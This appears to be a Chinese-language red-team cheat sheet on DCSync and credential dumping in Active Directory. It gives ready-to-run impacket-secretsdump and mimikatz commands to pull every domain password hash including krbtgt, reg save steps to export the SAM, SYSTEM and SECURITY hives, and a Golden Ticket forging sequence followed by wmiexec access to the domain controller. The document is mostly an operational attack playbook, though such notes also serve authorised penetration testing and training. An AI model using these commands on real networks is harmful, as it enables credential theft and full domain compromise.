---
os: linux
service: AD
syntax: impacket-secretsdump -dc-ip <DC> -just-dc <DOMAIN>/<USER>:<PASS>
tags:
  - cmd
---

# DCSync 与凭据导出

## 原理
- DCSync：利用目录复制协议（DRSUAPI）从 DC 拉取任意用户的 hash（含 krbtgt）
- 需要 `DS-Replication-Get-Changes` / `Get-Changes-All` 权限（即 Replicating Directory Changes）
- secretsdump 还能离线 dump 本机 SAM / SYSTEM / NTDS.dit

## 前提
- 拥有具备 DCSync 权限的账户（Domain Admins、Enterprise Admins、被授权 Replicating Directory Changes 的账户等）
- 或能读目标机器的 SAM + SYSTEM 注册表（本地管理员）

## 前置检查
- 确认当前账户是否有复制权限，直接尝试拉取单个用户：
```bash
impacket-secretsdump -dc-ip <DC> -just-dc-user Administrator <DOMAIN>/<USER>:<PASS>
```
- 报 `can't get replication data` 说明权限不足

## 利用步骤

### 1. 远程 DCSync（secretsdump）
```bash
impacket-secretsdump -dc-ip <DC> -just-dc <DOMAIN>/<USER>:<PASS>
```
- dump 全部域用户 hash（含 krbtgt）
- 只看单个用户：
```bash
impacket-secretsdump -dc-ip <DC> -just-dc-user Administrator <DOMAIN>/<USER>:<PASS>
```

### 2. mimikatz DCSync
```powershell
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
lsadump::dcsync /domain:<DOMAIN> /all /csv
```
- 在能登录 DC 或有 DCSync 权限的上下文中运行

### 3. 本地 SAM / SYSTEM 离线 dump
先导出注册表（需本地管理员）：
```powershell
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY
```
本地读 hash：
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 4. 拿到 krbtgt hash 后：Golden Ticket
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<DC>
```

## 常见坑
- DCSync 需要 Replicating Directory Changes 权限，普通用户会失败
- SAM / SYSTEM 必须来自同一台机器，否则 hash 对不上
- 导出 NTDS.dit 需要 SYSTEM 权限 + VSS 快照，别直接拷贝正在使用的 NTDS.dit

## 参考开源项目
- impacket (https://github.com/fortra/impacket)
- mimikatz (https://github.com/gentilkiwi/mimikatz)
